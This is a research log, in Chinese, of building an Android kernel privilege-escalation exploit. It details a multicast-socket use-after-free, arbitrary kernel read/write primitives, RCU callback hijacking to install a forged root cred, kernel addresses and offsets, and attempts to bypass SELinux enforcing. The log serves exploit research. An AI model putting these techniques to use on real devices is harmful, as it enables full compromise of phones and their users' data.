## 2. 已确认的技术事实（可直接引用）

**kimg.bin 的地址换算**：`file_off = kaddr - 0xffffffc000080000`
（已验证：`init_cred` kaddr `0xffffffc00162dd20` → file off `0x15add20`）

### 2.2 为什么不能用 ret2usr

用户页 PTE 带 `PTE_PXN`（Privileged eXecute Never），EL1 从用户页取指直接 instruction abort。
**所有"内核返回用户代码"的常规思路全部作废**，必须让内核执行**内核自己的代码**。

### 2.3 任意读原语：`ip_mc_msfget`

```c
psl = pmc->sflist;
copy_to_user(&optval->imsf_slist[0], psl->sl_addr, copycount * 4);
```

`struct ip_sf_socklist`：
```
sl_max    @ 0   (u32)
sl_count  @ 4   (u32)
rcu       @ 8   (struct rcu_head, 16 字节)
sl_addr[] @ 24  (__be32[])
```
→ **把 `sflist` 设为 `target - 24`，`copy_to_user` 就会把 `target` 起的内存拷到用户态。**
读长度由 `sl_count` 和用户传入的 `copycount` 共同决定，实测一次可读 0xc0 字节。

### 2.4 `struct ip_mc_socklist` 布局

```
next_rcu        @ 0
multi.imr_multiaddr @ 8
imr_address     @ 12
imr_ifindex     @ 16
sfmode          @ 20
sflist          @ 24
rcu             @ 32 (next) / 40 (func)
...
```
`sizeof` 很大（含 `multi.sources` 等），但我们只关心上面这些。

### 2.5 `struct cred` 真实布局（从 `init_cred` dump 逐字节验证）

```

suid            @ 0x0c
sgid            @ 0x10

fsuid           @ 0x1c

securebits      @ 0x24

```
总大小 0x90，但 `prepare_creds` 的 `memcpy` 长度是 **0xa0**（多拷相邻 `init_groups`，无害）。

`task_struct` 里的指针偏移：
```

cred      @ 0x4e0
```

### 2.6 `override_creds` 反汇编（实测）

```
mov  x1, sp
ldr  w3, [x0]            ; ldxr 需要一个 4 字节对齐的地址！
and  x2, x1, #~0x3fff
ldr  x1, [x2, #0x10]     ; current
ldr  x1, [x1, #0x4e0]    ; task->cred
ldxr w3, [x0]            ; atomic_inc(new->usage)
add  w3, w3, #1
stxr w4, w3, [x0]
cbnz w4, -8
dmb  ishst
ldr  x2, [x2, #0x10]
str  x0, [x2, #0x4e0]    ; task->cred = new
ldr  w0, [x1]
mov  x0, x1
ret
```
**只做 `atomic_inc(new->usage)` + `task->cred = new`，没有任何 BUG_ON。**
注意 `ldxr` 是独占访存，**要求地址 4 字节对齐**，否则 data abort。

### 2.7 `commit_creds` 反汇编（实测）

开头：
```
cmp x19, x0        ; task->cred vs task->real_cred
b.eq ...
brk #0             ; 不等就 BUG()
```
然后检查 `usage > 0`，否则也 `brk`。
→ **`override_creds` 之后 `real_cred` 未变，此时再调 `commit_creds` 必炸。**
这就是早期两次静默重启的真因（当时误判为别的）。

### 2.8 RCU 回调机制

`kfree_rcu(ptr, rcu)` 等价于 `call_rcu(&ptr->rcu, offset_to_func)`。
`__rcu_reclaim`：
```c
offset = head->func;
if (offset < 4096) kfree(head - offset);
else               head->func(head);      // ← 任意内核函数调用，参数 = head
```

`rcu_do_batch`（`kernel/rcutree.c:2038`）：
```c
list = rdp->nxtlist;
rdp->nxtlist = *rdp->nxttail[RCU_DONE_TAIL];
*rdp->nxttail[RCU_DONE_TAIL] = NULL;   // 清的是"上一批最后一个"的 next
tail = rdp->nxttail[RCU_DONE_TAIL];
while (list) { next = list->next; ...; __rcu_reclaim(rsp->name, list); list = next; }
```
**关键**：`*nxttail[DONE] = NULL` 清的是尾元素的 next，**不会**清刚入队的 head 的 next。

`__call_rcu` 有 `WARN_ON_ONCE((unsigned long)head & 0x3)`：head 未对齐会打 WARN（无害，可作为入队成功的信号）。

**回调按 CPU 入队**（挂到当前 CPU 的 `rdp->nxtlist`），由该 CPU 上的 `rcu_do_batch` 处理，宿主可能是被中断的任务，也可能是 `ksoftirqd`。

### 2.9 为什么早期 `head = P + 32` 不可行

`P` 来自 IPv6 组播地址前 8 字节，首字节必须是 `0xff`（组播校验），
所以 **`P ≡ 0xff (mod 256)` 是硬约束**，`P + 32 ≡ 0x1f`，永远 4 字节不对齐 → `ldxr` 必炸。

**改用 `sflist` 的 rcu_head**：`psf = 0x0c0001f8` → `head = 0x0c000200`（16 字节对齐），
而且内核会把 `head1->next` 链成 `head2 = 0x0c00011f`，于是
`cred.usage = 0x0c00011f`（非 0）、`cred.uid = 0` —— **fake cred 头 8 字节天然正确**（已实测 `N0 00000000 0c00011f`）。

### 2.10 UAF 的建立方式

`ip_mc_leave_group()` 里：
```c
*imlp = iml->next_rcu;    // 从链表摘除
```
`iml` 是我们能影响的对象，`next_rcu` 被写成 `P`（用户页地址）。
→ **`ser->mc_list == P`，即 socket 的组播链表头指向了一块用户可控内存。**

于是：
- `for_each_pmc_rtnl(inet, pmc)` 第一个遍历到的就是 `P`
- `pmc->sflist`、`pmc->sfmode`、`pmc->multi.*` 全部由我们控制
- `close()` → `ip_mc_drop_socket` → `ip_mc_leave_src` → `kfree_rcu(psf, rcu)`，`psf = pmc->sflist` 可控

**为什么选 `close()` 路径**：`ifindex = 0` 时 `ip_mc_del_src` 立刻返回 `-ENODEV`，
但 `kfree_rcu(psf)` 无条件执行 —— 副作用最少的入队路径。

## 3. 踩坑清单（避免重复）

| # | 坑 | 现象 | 根因 | 对策 |
|---|---|---|---|---|
| 1 | ret2usr | 立即 instruction abort | 用户页 `PTE_PXN` | 只能调用内核自己的代码 |
| 2 | `commit_creds` 后调 | 静默重启 | `BUG_ON(cred != real_cred)` | override 后不要再 commit，改 `fork()` 让 `copy_creds` 重建 |
| 3 | `cred.security` 偏移记错 | fake cred 是坏的 | 实际 0x70，不是 0x98 | 以 `init_cred` dump 为准；`memcpy` 长度 0xa0 |
| 4 | helper 子进程持 COW 副本 | 几毫秒内必静默重启 | 子进程在别的 CPU 用自己那份页解释 rcu_head → 链表错乱 | **UAF 建立后立刻 kill 掉所有 helper** |
| 5 | close 与改写之间插入 `puts`+`fsync` | 偶尔失败 | fsync 会调度出去，RCU 抢先用默认 func=8 → `kfree(0x0c0001f8)` | 诊断打印挪到 close **之前**，close 返回后第一条指令就 `str` |
| 6 | `sendto(127.0.0.1:9)` | 根本走不到 `rcu_read_unlock_bh` | 端口无监听 → ICMP 不可达 → `sk_err` 置位 → 后续 sendto 直接失败 | 自己 `bind` 一个接收端，把 UDP 发给自己 |
| 7 | `CLONE_VM` 忘了 `CLONE_FILES` | `close()` 没真正释放 socket，UAF 没建立 | 每个兄弟复制了 fd 表，各自多持一个 `struct file` 引用 | `flags = CLONE_VM\|CLONE_FILES\|SIGCHLD`（`0x511`） |
| 8 | `adb shell "... &"` 拖死连接 | `exit 137` / `error: closed` | adb 会等所有子进程关闭 stdout/stderr | 必须 `>/dev/null 2>&1 </dev/null &` 三重重定向 |
| 9 | panic 现场完全抓不到 | 只有"震一下然后重启" | `panic_on_oops=1`、无 pstore、`/proc/last_kmsg` 不存在 | 只能靠 `/proc/PID/mem` 读实时内存 + `prctl(PR_SET_NAME)` |
| 10 | 系统 `llvm-objdump` 不支持 `-b binary` | 报错 | 工具限制 | 用一个临时脚本把裸机器码包成最小 ELF 再反汇编（思路同 `analysis/probes/device/mkelf.py`） |

## 5. 当前主攻方向：`ip_mc_source` 同步写原语

`ip_mc_source()`（`net/ipv4/igmp.c`，`setsockopt(IP_ADD_SOURCE_MEMBERSHIP)` 进来）：

```c
psl = rtnl_dereference(pmc->sflist);
...
if (psl && psl->sl_count >= sysctl_igmp_max_msf) { err = -ENOBUFS; goto done; }
if (!psl || psl->sl_count == psl->sl_max) { /* 分配 newpsl，走不到写点 */ }

rv = 1;
for (i = 0; i < psl->sl_count; i++) {
    rv = memcmp(&psl->sl_addr[i], &mreqs->imr_sourceaddr, 4);
    if (rv == 0) break;
}
if (rv == 0) goto done;                     // 地址已存在 → 报错退出
for (j = psl->sl_count - 1; j >= i; j--)
    psl->sl_addr[j + 1] = psl->sl_addr[j];
psl->sl_addr[i] = mreqs->imr_sourceaddr;    // ★ 写点
psl->sl_count++;                            // ★ 附带 +1
```

**当 `sl_count == 0`**：循环不执行（`i = 0`），移位不执行，
于是就是 **`*(u32*)(sflist + 24) = imr_sourceaddr`** 一次干净的单次写入，
**同步、在调用者自己的进程上下文里、受 `rtnl_lock` 保护**，完全不依赖 RCU。

**优点**：绕开"回调落到 ksoftirqd"的死结。
**约束**：
- `sflist + 24` 是写入目标 → `sflist = target - 24`
- `*(u32*)(target - 20)`（= `sl_count`）必须 `< sysctl_igmp_max_msf`，且 `!= *(u32*)(target-24)`
- **副作用**：`*(u32*)(target - 20) += 1`

**入口条件**（需要先满足）：
- `ipv4_is_multicast(addr)` —— 组播地址，天然满足
- `in_dev != NULL` —— 需要一个**真实的 ifindex**（不能是 0）
- `for_each_pmc_rtnl(inet, pmc)` 能找到匹配项 —— 我们的 `P` 已经在 `ser->mc_list` 头上，
  只要 `P+8`（`imr_multiaddr`）和 `P+16`（`imr_ifindex`）与请求一致即可命中

## 8. 进展更新（阶段七）

### 8.1 解决了"每次实验都要重启"的问题

以前用 `timeout -s KILL` 跑，进程被 SIGKILL 后 mm 释放会触发 oops → 重启，一次浪费 20~30 秒。
改成**后台启动 + 不杀进程**：

```bash
adb shell "cd /data/local/tmp; ./probeN > pN.log 2>&1 </dev/null & echo started; sleep 14; cat pN.log"
```

关键点：`&` + 三重重定向（`>/dev/null 2>&1 </dev/null`），否则 `adb shell` 会等子进程关闭 stdout 而卡死。
这样进程一直 hang 着不退出，设备不再重启，可以连续迭代。

### 8.2 找到 `task_struct->tasks` 的 offset = 0x2b0

**过程**：init_task 里 12 个 list_head 候选全是自环（因为 `kimg.bin` 是运行时 dump，
`tasks` 早就不是自环了，反而是那些"永远自环"的链表才匹配上我的指纹法）。

**正确做法**：直接扫 `init_task+0x00..0x400` 的所有堆指针，发现
`init_task+0x2b8` 存着一个指向堆的值，减 0x2b8 后读 `+0x4e8` 出来是 `...probe14.` —— **偏移差 8**。
由此推断：我读的是 `tasks.**prev**`（+0x2b8），所以 **`tasks` 本体在 +0x2b0**，`prev` 在 +0x2b8。

**验证**：从 `+0x2b8`（= prev，指向最新创建的进程）反向遍历，立刻找到自己：
```
R ffffffc093654200 [hohopwn0........]
```
正向遍历也能完整走完 240 个任务（`init` / `kthreadd` / `ksoftirqd/0` / `kworker/...`），
但中途会因为某个节点的 next 读失败而断，所以**反向遍历更可靠**（我们在链表尾部）。

**关键结构偏移汇总**：
```
TASKS_OFF  = 0x2b0   (tasks.next)
TASKS_PREV = 0x2b8   (tasks.prev)
OFF_REAL_CRED = 0x4d8
OFF_CRED      = 0x4e0
OFF_COMM      = 0x4e8
```

### 8.3 拿到了自己的 cred，并算出写原语的可行位置

实测（probe16）：
```
task = 0xffffffc093654200
cred = 0xffffffc0ae4560c0
CD 00000218 000007d0 000007d0 000007d0 000007d0 000007d0 000007d0 000007d0 000007d0 00000000 ...
   usage=0x218, uid..fsgid 全 2000(0x7d0), securebits=0, cap_* 全 0
```

写原语的约束再澄清一次：`psl = target - 24`，
`sl_max = *(u32*)(target-24)`，`sl_count = *(u32*)(target-20)`，
必须满足 `sl_count < sysctl_igmp_max_msf(10)` 且 `sl_count != sl_max`，
此时 `i = sl_count`，写入 **`target + 4*sl_count`**，并附带 `*(u32*)(target-20) += 1`。

要让 `i = 0`（精确写 target），需要 `*(u32*)(target-20) == 0`。
而 cred 前面 `cred-0x14` 和 `cred-0x10` 恰好都是 0 → `sl_count == sl_max == 0`
→ 走 `newpsl` 分配分支 → `kfree_rcu(cred+0x20)` 把 cred 内部当地址释放 → **绝对禁止**。

**唯一能直接写的位置是 `target = cred + 0x38`（cap_effective 低 32 位）**：
- `sl_max = *(u32*)(cred+0x20) = fsgid = 2000`（非 0）
- `sl_count = *(u32*)(cred+0x24) = securebits = 0`（< 10，且 != 2000）✓
- 写入 `cap_effective = 0xffffffff` → 拿到全部低 32 位能力（含 CAP_SETUID/CAP_SETGID/CAP_DAC_OVERRIDE）
- 副作用：`securebits` 变 1（SECURE_NOROOT），可接受

### 8.4 踩坑：`IP_ADD_SOURCE_MEMBERSHIP` 会偷偷 `join_group`

`net/ipv4/ip_sockglue.c:807`：
```c
} else if (optname == IP_ADD_SOURCE_MEMBERSHIP) {
    ...
    err = ip_mc_join_group(sk, &mreq);      // ★ 先插入一个真实 pmc 到链表头
    if (err && err != -EADDRINUSE) break;
    omode = MCAST_INCLUDE; add = 1;
}
err = ip_mc_source(add, omode, sk, &mreqs, 0);
```
真实 pmc 被头插后，`for_each_pmc_rtnl` 第一个遇到的就不再是我们的 `P`，
写操作作用到新分配的 `newpsl` 上，我们的 `P` 完全没参与。

**改用 `IP_BLOCK_SOURCE`（=38）**：同样走 `ip_mc_source`，但 `omode = MCAST_EXCLUDE(0)`、`add = 1`，
**不调用 `ip_mc_join_group`**，所以不会污染链表。代价是 `P+20`（sfmode）必须是 0。

### 8.5 当前卡点

用 `IP_BLOCK_SOURCE` + `P+20=0` + `P+16=0` 时，`ip_mc_source` 返回 `-EINVAL`（`!pmc`），

## 9. 第 4 轮：从"读原语"推进到"任意内核函数调用"（2026-11-08 凌晨）

> 本轮把 `report/阶段性报告_2026-11-08.md` 之后的进展全部记在这里。

### 9.1 4 字节写原语的**精确约束**（源码级，`net/ipv4/igmp.c:1911 ip_mc_source`）

```c
if (psl && psl->sl_count >= sysctl_igmp_max_msf)  return -ENOBUFS;   // sl_count < 10
if (!psl || psl->sl_count == psl->sl_max) { ... newpsl 分支, kfree_rcu(psl) ... }
rv = 1;
for (i = 0; i < psl->sl_count; i++) { rv = memcmp(&sl_addr[i], &src, 4); if (!rv) break; }
if (rv == 0) goto done;                       // 已存在 → 报错, 不写
for (j = psl->sl_count - 1; j >= i; j--) sl_addr[j+1] = sl_addr[j];   // i == sl_count 时是空循环
psl->sl_addr[i] = mreqs->imr_sourceaddr;      // ★ 写点: 地址 psl + 24 + 4i, i = sl_count
psl->sl_count++;                              // ★ 副作用: psl+4 自增
```

`struct ip_sf_socklist` 布局（**关键，之前记错过**）：
`sl_max@0  sl_count@4  rcu.next@8  rcu.func@16  sl_addr[]@24`

所以"把 4 字节写到 target"的完整条件是：

| 项 | 要求 |
|---|---|
| `psl` | `= target - 24 - 4k` |
| `sl_count`（读 kernel 内存得到） | `= k`，且 `k ∈ [0, 9]` |
| `sl_max` | `!= k`（否则会走 newpsl 分支被重定向） |
| 副作用 | `target - 20 - 4k` 处的 u32 被 **+1** |

**结论：写原语有一个"锚点约束"—— 目标地址前面 20~56 字节内必须存在一个小整数 `k∈[0,9]`。**
这是本轮最大的拦路虎。

### 9.2 锚点实测：哪些目标能写、哪些不能（`probe36`，`kfind()` 只看不写）

| 目标 | 需要的锚点位置 | 实测 | 原因 |
|---|---|---|---|
| `cred+0x38`（cap_effective 低 32 位） | `cred+0x24` = 0，`cred+0x20` ≠ 0 | ✅ `k=0` | fsgid=2000，后面 securebits=0 |
| `cred+0x30`（cap_permitted） | `cred+0x18/0x1c` 都是 2000 | ❌ `-2000` | 只有 2000，凑不出 0..9 |
| `cred+0x70/0x74`（cred->security） | keyring 区 0x48~0x6c **全是 0** | ❌ | 全 0 区只能 k=0，而 k=0 又要求前一格非 0，自相矛盾 |
| `tsec+0/+4`（osid/sid） | tsec 前面 0x20 字节**全是 0** | ❌ | 同上 |
| `selinux_enforcing` (0xffffffc00187d47c) | 邻域全是 `0xffffffc0` / `0x10203xxx` | ❌ | 没有小整数 |
| `core_pattern` / `poweroff_cmd` / `uevent_helper` | 字符串或全 0 区 | ❌ | 同上 |

→ **"直接写 `selinux_enforcing` = 0"这条最省事的路被锚点约束堵死了。**

### 9.3 直接改自己 cred 的战果（`probe36`）

`cred` 全量 dump（实测，`uid=2000` 的 shell 进程）：

```
+0x1c fsuid=7d0    fsgid=7d0  securebits=0

```

操作与结果：

```
W1 k=00000000 00000000     ← kwrite(cred+0x38, 0xffffffff) 返回 0，成功

                            （0x24 变成 1 = 我们写原语的副作用）
```

### 9.4 RCU 回调 = **任意内核函数调用**，参数 x0 = 我们完全可控的用户页

`kfree_rcu(psl, rcu)`（`psl` 是我们的用户页，由 `pmc->sflist` 决定）：

```c
offset = offsetof(ip_sf_socklist, rcu) = 8;
__kfree_rcu(&psl->rcu, 8) → kfree_call_rcu(head, (void*)8)  →  head->func = 8, 入队
__rcu_reclaim(head):
    if (head->func < 4096)  kfree(head - 8);        // 默认行为 = kfree(用户页) → panic
    else                    head->func(head);       // ★ 用户态把 func 改成任意内核函数即可
```

**内存布局（务必按这个来）**：
```
psl+0  sl_max      psl+4  sl_count
psl+8  = head      head+0 = next     head+8 = func     head+24 = sl_addr[0]
```
→ fake cred 就放在 `head`（即 `psl+8`），于是：
- `cred.usage = 低32(head->next)`、`cred.uid = 高32(head->next)`
- `cred.gid/sgid`（+8/+12）**正好是 `head->func`**，会被函数指针覆盖 → gid 变垃圾，无害
- 因此必须**连排两个回调**：`head1->next = head2`，`head2 = 0x0c000708` → usage=0x0c000708、uid=0
- `head2->func` 填一个裸 `ret` gadget：`0xffffffc000204a60`（`exit_thread`，首字节 `d65f03c0`）

**选 `override_creds` 而不是 `commit_creds`**（`kernel/cred.c`）：
```c
const struct cred *override_creds(const struct cred *new) {
    old = current->cred;
    get_cred(new);                        // usage++
    rcu_assign_pointer(current->cred, new);
    return old;
}
```
只有 3 个动作，没有 `put_cred`/keyring/proc connector。`commit_creds` 则要
`BUG_ON(task->cred != real_cred)`、`put_cred(old)×2`、`key_fsuid_changed`、
`proc_id_connector`（可能 sleep）—— 在软中断上下文里极易把机器打挂（probe31 实测必崩）。

`fake cred` 关键字段：`security → 用户页上的假 task_security_struct{osid=1, sid=1(SECINITSID_KERNEL)}`
→ 拿到 root 的同时把我们变成 **kernel 域**，SELinux 全放行，顺带解决 9.3 的死结。

### 9.5 真正的卡点：回调落在**哪个任务**上

`override_creds` 改的是 `current->cred`。probe34 实测 `fake.usage` 从 `0c000a08` 变 `0c000a09`
（说明 `get_cred` 真的跑了），但我们自己的 `getuid()` 还是 2000 → **回调落在了别的任务上**。

probe35 排除了 CPU 亲和性：`AFF 00000000 0000000000000001 CPU 00000000`（独占 CPU0，getcpu=0），
回调仍然打错人。

**根因分析（本轮最重要的推论）**：
- RCU 回调在 `rcu_process_callbacks()`（RCU_SOFTIRQ）里执行；
- `__do_softirq()` 有两条执行路径：
  1. `irq_exit()` → `invoke_softirq()` → **直接 `__do_softirq()`**，此时 `current` = 被中断的那个任务；
  2. 被 `wakeup_softirqd()` 唤醒的 **ksoftirqd/x** 线程。
- probe31/34 的自旋是 **setsockopt/sendto 系统调用循环**，每返回一次用户态都可能因 `need_resched`
  被 ksoftirqd 抢走 → 回调全被 ksoftirqd/0 吃掉。
- **对策：触发之后改成"纯用户态空转"（不夹任何系统调用）**。时钟中断（每 4~10ms）走
  `irq_exit → __do_softirq`，`current` 必然是我们自己，ksoftirqd 根本没机会跑。

（`rcu_check_callbacks()` 本身就是在 tick 的硬中断上下文里调 `invoke_rcu_core()` 把
RCU_SOFTIRQ 挂起的，所以"挂起"和"执行"发生在同一次 tick 里，顺序天然有利。）

### 10.3 关键源码更正：**"任意写"和"入队回调"是互斥的两条路径**

精读 `net/ipv4/igmp.c:1997-2036`：

```c
if (psl && psl->sl_count >= sysctl_igmp_max_msf) { err = -ENOBUFS; goto done; }   // k < 10
if (!psl || psl->sl_count == psl->sl_max) {          // ★ 走这里 = 入队 kfree_rcu
    newpsl = sock_kmalloc(sk, IP_SFLSIZE(count), GFP_KERNEL);
    newpsl->sl_max  = count;
    newpsl->sl_count = count - IP_SFBLOCK;
    if (psl) {
        for (i=0; i<psl->sl_count; i++) newpsl->sl_addr[i] = psl->sl_addr[i];
        atomic_sub(IP_SFLSIZE(psl->sl_max), &sk->sk_omem_alloc);
        kfree_rcu(psl, rcu);                          // ★ 入队
    }
    rcu_assign_pointer(pmc->sflist, newpsl);          // ★ pmc->sflist 被换成新对象
    psl = newpsl;
}                                                     // 否则 newpsl = psl，就地写
...
psl->sl_addr[i] = mreqs->imr_sourceaddr;              // ★ 写点（psl 可能已是 newpsl）
psl->sl_count++;
```

结论（很重要，之前混用过）：
- `sl_count == sl_max` → 入队回调有效，但**写点落在内核新分配的 `newpsl` 上，对目标地址无效**；
- `sl_count < sl_max` → 才在**我们指定的 `psl`** 上做 `sl_addr[i] = 值`（probe36 的 `kwrite` 走的是这条）；
- 所以 `kwrite(cred+0x38)`（probe36）和"排回调"（probe37+）必须用**两套不同的 `sl_max/sl_count`**。
- 另一个副作用：每触发一次，`pmc->sflist` 就被内核改成新分配的 `newpsl`，
  所以**每轮触发前必须重新写回 `P_FAKE+24 = PSL1 / PSL2`**（现已在这么做）。

### 10.4 RCU 链的真实形态（实测反推，之前记错了一半）

`__call_rcu()` 每入队一个 head，就把**上一个 head 的 `next`** 指向它（`*rdp->nxttail[TAIL] = head`）。
所以两个 head 串起来之后：

```
head1 = 0x0c000208  ( = CRED = PSL1+8 )
head1->next = 0x0c000708  ← 这是【内核】在入队 head2 时写的, 不是我们写的
                └→ 于是 cred.usage = 0x0c000708, cred.uid = 0   (天然正确)
head2 = 0x0c000708  ( = PSL2+8 )
head2->next = NULL        ← rcu_do_batch 里 *nxttail[RCU_DONE_TAIL] = NULL 清的
head2->func = RET_GADGET  (我们自己写)
```

**新发现的重要副作用**：`head->func` 占 `cred+0x08..0x0f`，正好压掉 `cred.gid` 和 `cred.suid`。
所以这两个字段**必然是函数指针的两半**（`override_creds` → `gid = 0x00243f60`、`suid = 0xffffffc0`），
而且改不掉（一改就把回调函数指针写坏）。好消息是 `usage/uid/euid/fsuid` 全都不受影响。

### 10.6 本轮的核心改进：假 cred 改成 `init_cred` 的逐字节克隆

之前假 cred 里有两个**假指针**：
- `cred.security → FAKE_TSEC`（用户页，`sid = 1`）
- `cred.user → 真实 shell 的 user_struct`（uid 2000 的 user）

现在改成（`probe43`）：用任意读把 `init_cred`（`0xffffffc00162dd20`）的 `0x90` 字节整块读出来，
**只复制 `+0x10 .. +0x8f`** 到 `CRED`（`+0x00..+0x0f` 是 `head->next` / `head->func`，必须留给内核和我们自己）。

好处：
- `security` / `user` / `user_ns` / `group_info` 全部是**真内核对象**，不存在任何"假指针解引用"的崩溃面；
- `sid` 直接变成 `u:r:kernel`（`selinux_capable` 的 `avc_has_perm(1,1,...)` 可能就放行了）；
- caps 天然是 `0x1fffffffff`（全量 + 一点余量）；
- 唯一不完美的是 `gid/suid` 被函数指针压掉（见 10.4），但 `uid/euid/fsuid` 全是 0。

## 12. 第 7 轮：`setenforce` 被拒，但拿到了 utf-8 级别的确定结论（2026-11-08 02:35）

### 12.1 `probe47` 实测结果

`probe47` 成功走到触发点（`234Lm00000000` → `R00000001 00000000 00000000 s0c000708`），
随后 klog 里出现 32 条相关 avc 记录。去重后时间线（`t=` 为内核秒）：

```
94.4384  denied { use } tclass=fd  scontext=u:r:kernel:s0 -> u:r:shell:s0  probe47.log
...      （连续 21 条，全是 fd use）
94.4495  denied { setenforce } tclass=security  scontext=u:r:shell:s0 -> u:object_r:kernel:s0
...      （后面还有 10 条 fd use，scontext 仍是 u:r:kernel:s0）
```

**`{ use }` 这条拒绝本身就是"我们在内核域"的铁证**，因为 `file_has_perm()` 里：
```c
u32 sid = cred_sid(cred);
if (sid != fsec->sid)
        rc = avc_has_perm(sid, fsec->sid, SECCLASS_FD, FD__USE, &ad);
```
`fsec->sid` 是**打开 fd 那一刻**的域（shell），而 `sid` 是当前的域。
只有当 `sid` 真的变成了 `u:r:kernel:s0` 才会触发这条拒绝。所以：
**`current->cred` 确实是我们那份 `init_cred` 克隆，`override_creds` 干净地成功了。**

### 12.2 结论：内核域**不能** `setenforce`

`setenforce` 走的是
`sel_write_enforce()` → `avc_has_perm(current_sid(), SECINITSID_KERNEL, SECCLASS_SECURITY, SECURITY__SETENFORCE, NULL)`
→ 被拒。**`u:r:kernel:s0` 没有 `security:security setenforce` 权限**（至少在本机 policy 下）。

一个尚未解释的矛盾：这条 audit 的 `scontext` 写的是 `u:r:shell:s0`，
而前后 12ms 内的 fd-use 记录都是 `u:r:kernel:s0`。两种可能：
- **（a）** 审计里 `setenforce` 的 scontext 取值路径和 fd-use 不同（比如取了 `fsec->sid` 或缓存的 sid）；
- **（b）** 那一刻 `current->cred` 真的被换回了。

倾向（a）：因为紧接着 94.449555 起的 fd-use 又是 `kernel`，说明 cred 没有变回去。
下一轮要用不依赖 audit 的手段把这件事钉死（见 12.4）。

## 13. 第 8 轮：mmap 报告通道（解决盲区）+ 暴力枚举域（2026-11-08 02:50）

### 13.1 先说结论

**这一轮解决了最根本的工程障碍：提权后写不出任何日志的问题。**

方案：**提权前 mmap 一个文件，提权后写内存页。**

```c
fd  = open("/data/local/tmp/rep.bin", O_RDWR|O_CREAT|O_TRUNC);
ftruncate(fd, 0x10000);
ptr = mmap(0x0d000000, 0x10000, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, fd, 0);
/* ... 提权 ... */
*(char *)ptr = 'x';        // ← 这一步走 page fault, 不经过任何 SELinux hook
msync(ptr, 0x10000, MS_SYNC);
```

**为什么能行**（这是关键，值得记住）：

| 环节 | 是否查 SELinux |
|---|---|
| `open()` | 查（`file:open`），但这是在**提权前**做的，用的是 shell 域，有权限 |
| `mmap()` | 查（`security_mmap_file`），同样在提权前 |
| **写内存页触发 page fault** | **不查**。`do_page_fault` → `handle_mm_fault` → `filemap_fault`，全链路没有任何 LSM hook |
| `msync()` | 不查（`vfs_fsync_range` 只做文件系统层落盘） |
| 内核 writeback 线程回写脏页 | 更不查（跟我们的进程无关） |

也就是说：**文件描述符的权限检查只在 open/mmap 时发生一次，之后通过内存页写入是完全"后台"的**。
这条通道对 "u:r:kernel 域" 这种被文件权限困住、但仍有任意内存访问能力的场景，是决定性的。

实测验证（probe48 提权**之前**写入的内容，pull 出来后完整）：

```

000000000d000000
```

`mo=00000000` 说明 `rp_open()` 返回 0（成功），第二行是 mmap 得到的用户地址 `0x0d000000`。

### 13.6 probe49：不猜偏移，直接暴力枚举域

核心洞察：**SELinux 的域是由 `cred->security->sid` 决定的，而这个结构现在在我们自己的用户页里（`FAKE_TSEC`）。**

所以只要知道"哪个 sid 有 `setenforce` 权限"，把它写进去就赢了。
而"哪个 sid 有权限"这件事，**可以直接试出来**，不需要读 policy：

```
遍历 tasks 链表（前 200 个任务）
  对每个任务：task->comm, task->cred, cred->security, tsec->sid
  收集所有不重复的 sid（最多 40 个）

对每个不同的 sid：
  *(u32*)(FAKE_TSEC + 0) = sid    // osid
  *(u32*)(FAKE_TSEC + 4) = sid    // sid
  fe = open("/sys/fs/selinux/enforce", O_WRONLY)
  wr = write(fe, "0", 1)
  记录结果；wr == 1 就赢了
```

这个方案的好处：

- **不依赖任何结构体偏移的正确性**（只用已经验证过的 `task->cred @ 0x4e0`、`cred->security @ 0x70`、`tsec->sid @ 0x4`）；
- **不依赖 `comm` 匹配**（只用来在输出里标注是哪个域，匹配失败也不影响功能）；
- **失败也能拿到全部数据**（40 个域的尝试结果全部落进 rep.bin）；
- 每次尝试都是独立的，某个域不信也只会得到 `-EACCES`，不会崩。

按 Android 6 的 policy，`init` 域有 `security:security setenforce`，
所以只要 `init` 在任务链表里被枚举到，这一轮就该结束。

### 13.7 一个尚未利用的强大能力

`selinux_enforcing` 的地址已知（`0xffffffc00187d47c`），值 = 1。
我们的 4 字节写原语在这里被锚点封死（前 20~56 字节内没有小整数）。

但**RCU 回调 = 任意内核函数调用**这条路是通的。
问题只在于 `__rcu_reclaim` 调用时 `x0 = rhp`（回调头地址，非 0），
而 `security_setenforce(val)` 需要 `val == 0` 才能关掉 enforcing。

如果能在内核里找到一条 `mov x0, #0; b security_setenforce` 的指令序列（gadget），
就能一次性完成，不需要换域。**留作备选。**

### 13.8 进度小结（更新）

```
✅ 任意内核读（4 字节，稳定）
✅ 条件任意内核写（锚点约束，cred+0x38 可用）
✅ RCU 回调 → 任意内核函数调用（稳定，链式两个回调不崩）
✅ override_creds(假 cred) → uid 0 + 全 caps + 任意 SELinux 域（可热切换）
✅ 提权后任意写文件（mmap 通道，绕过 SELinux）   ← 本轮新增
🔶 SELinux enforcing=0（probe49 暴力枚举域中）
⬜ 持久化 su / 一键 root APK
```

# 第 9 轮：SELinux 死结的破解（probe49 ~ probe57）

这一轮是全程最硬的一段。表面上一直在"重启→跑探针→失败→重启"，
但其实中间连破了 5 个错误假设，最后把出路找到了。按时间顺序记。

## 14.1 probe49/probe50：暴力枚举 40 个域全失败

思路：既然 `security_ops` 那套走不通，就换个思路 —— 我们有 `cred->security`
的完整控制权（指向自己的用户页 `FAKE_TSEC`），可以把 `sid` 随便改成任何
进程的域，试试谁的 `setenforce` 权限能过。

做法：遍历 `init_task.tasks` 链表，收集每个进程的 `tsec->sid`，逐个灌进
`FAKE_TSEC` 试 `write("/sys/fs/selinux/enforce", "0")`。

**probe49 结果（第一次跑，遍历方向错了）**
```
B scan 000000b7 uniq 00000028      ← 183 个任务, 40 个不同域
```
全部 `wfffffff3`(-EACCES) 或 `wfffffc19`(open 就失败)。
而且清单第一个是刚 fork 的 `klogw` —— 说明是从**尾部倒着**遍历的。

bug 原因：`kread_at(hd + 8, 8)` 读的是 `tasks.prev`，不是 `next`。

**probe50 修正后**
```
B next ffffffc0102a82b0 prev ffffffc03fcadab0
B scan 0000002d uniq 00000002
T00000000 s00000025 [init.er/] f000001f9 wfffffff3
T00000001 s00000001 [kthreadd]  f000001f9 wfffffff3
B all-fail
```

**硬结论 1：连 `init` 域（sid 0x25）都没有 `setenforce` 权限。**
`f000001f9` 说明 open 成功（fd=505），write 返回 -EACCES。
这条路彻底死了 —— 这台机器是 `ro.build.type=user`，policy 里
`allow domain security:security setenforce` 一条都没有。

## 14.2 probe51：RCU 回调单调 `reset_security_ops()` 必崩

